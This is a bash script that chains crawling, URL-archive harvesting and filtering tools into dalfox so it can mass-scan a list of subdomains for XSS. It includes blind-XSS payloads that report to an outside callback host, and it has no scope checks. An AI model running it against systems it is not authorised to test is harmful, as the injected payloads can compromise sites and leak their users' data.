#!/bin/bash

# Created by scr1pty
# Usage: ./detonator.sh alive.txt
# alive.txt - file with alive subdomains 1 by string in format: https://example.com
# Dependencies: katana, gau, uro, gf patterns, Gxss, dalfox
# DONT FORGET TO CHANGE BLIND XSS CALLBACK URL IN DALFOX COMMAND

echo -e "\033[0;32m"
echo "██████╗ ███████╗████████╗ ██████╗ ███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗ ";
echo "██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗";
echo "██║  ██║█████╗     ██║   ██║   ██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝";
echo "██║  ██║██╔══╝     ██║   ██║   ██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗";
echo "██████╔╝███████╗   ██║   ╚██████╔╝██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║";
echo "╚═════╝ ╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝";
echo -e "\033[0m"

# Define ANSI color codes
bold=$(tput bold)
mint=$(tput setaf 49)
reset=$(tput sgr0)

# Display usage if no argument is given
if [ $# -eq 0 ]; then
    echo "${bold}${mint}Usage: $0 <input_file>${reset}"
    exit 1
fi

input_file=$1

# Ensure the input file exists
if [ ! -f "$input_file" ]; then
    echo "${bold}${red}Error: File not found!${reset}"
    exit 1
fi

echo "${bold}${mint}Starting detonation: $input_file${reset}"

# Extract endpoints using Katana
echo "${bold}${mint}Running Katana crawling...${reset}"
cat "$input_file" | katana -jc >> Endpoints.txt
echo "${bold}${mint}Katana crawling complete. Data saved to Endpoints.txt${reset}"

# Discover more URLs from the Wayback Machine
echo "${bold}${mint}Fetching URLs using gau...${reset}"
cat "$input_file" | gau --threads 5 >> Endpoints.txt
echo "${bold}${mint}gau fetching complete. Data appended to Endpoints.txt${reset}"

# Filter out unique endpoints
echo "${bold}${mint}Filtering unique endpoints with uro...${reset}"
cat Endpoints.txt | uro >> Endpoints_unique.txt
rm Endpoints.txt  # Remove intermediate file
echo "${bold}${mint}Unique endpoints filtered. Data saved to Endpoints_unique.txt${reset}"

# Find potential XSS vulnerabilities
echo "${bold}${mint}Searching for XSS patterns using GF...${reset}"
cat Endpoints_unique.txt | gf xss >> XSS.txt
rm Endpoints_unique.txt  # Remove intermediate file
echo "${bold}${mint}XSS pattern search complete. Data saved to XSS.txt${reset}"

# Use Gxss to refine the XSS payloads
echo "${bold}${mint}Refining XSS payloads using Gxss...${reset}"
cat XSS.txt | Gxss -p khXSS -o XSS_Ref.txt
rm XSS.txt  # Remove intermediate file
echo "${bold}${mint}XSS payload refinement complete. Data saved to XSS_Ref.txt${reset}"

# Use Dalfox to scan for XSS vulnerabilities in the refined payloads
# Use your own blind XSS callback
echo "${bold}${mint}Scanning for XSS vulnerabilities using Dalfox...${reset}"
dalfox file XSS_Ref.txt -b https://EXAMPLE.bxss.in -o Vulnerable_XSS.txt
echo "${bold}${mint}Dalfox scanning complete. Vulnerable XSS results stored in 'Vulnerable_XSS.txt'.${reset}"

echo "${bold}${mint}XSS scanning process completed successfully. You can check XSS_ref.txt manually${reset}"
